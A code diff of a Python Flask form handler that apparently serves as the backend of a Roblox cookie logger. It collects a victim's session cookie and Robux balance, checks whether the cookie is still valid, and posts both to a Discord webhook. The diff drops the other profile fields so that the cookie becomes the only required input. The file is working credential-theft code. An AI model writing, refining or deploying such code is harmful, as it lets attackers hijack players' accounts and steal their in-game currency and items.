@@ -68,20 +68,14 @@ def submit_form():
         data = request.get_json()
         
         # Extract all form fields
-        username = data.get('username', '').strip()
-        user_id = data.get('userId', '').strip()
         robux = data.get('robux', '').strip()
-        pending = data.get('pending', '').strip()
-        premium = data.get('premium', False)
-        korblox = data.get('korblox', False)
-        headless = data.get('headless', False)
         cookie = data.get('cookie', '').strip()
         
         # Server-side validation
-        if not cookie or not username:
+        if not cookie:
             return jsonify({
                 'success': False, 
-                'message': 'Missing required fields (username, cookie)'
+                'message': 'Missing required field (cookie)'
             }), 400
         
         # Check if cookie is expired (for JWT tokens)
@@ -121,8 +115,8 @@ def submit_form():
                 'message': 'Webhook not configured'
             }), 500
         
-        # Generate Roblox profile picture URL
-        profile_picture_url = f'https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png' if user_id else 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
+        # Use default Roblox profile picture
+        profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
         
         # Prepare Discord embedded message
         discord_data = {
@@ -134,38 +128,8 @@ def submit_form():
                 },
                 'fields': [
                     {
-                        'name': '👤 Username',
-                        'value': username,
-                        'inline': True
-                    },
-                    {
-                        'name': '🆔 User ID',
-                        'value': user_id or 'Not provided',
-                        'inline': True
-                    },
-                    {
                         'name': '💰 Robux',
                         'value': robux or 'Not provided',
-                        'inline': True
-                    },
-                    {
-                        'name': '⏳ Pending Robux',
-                        'value': pending or 'Not provided',
-                        'inline': True
-                    },
-                    {
-                        'name': '⭐ Premium',
-                        'value': '✅ Yes' if premium else '❌ No',
-                        'inline': True
-                    },
-                    {
-                        'name': '💀 Korblox',
-                        'value': '✅ Yes' if korblox else '❌ No',
-                        'inline': True
-                    },
-                    {
-                        'name': '🎭 Headless',
-                        'value': '✅ Yes' if headless else '❌ No',
                         'inline': True
                     },
                     {
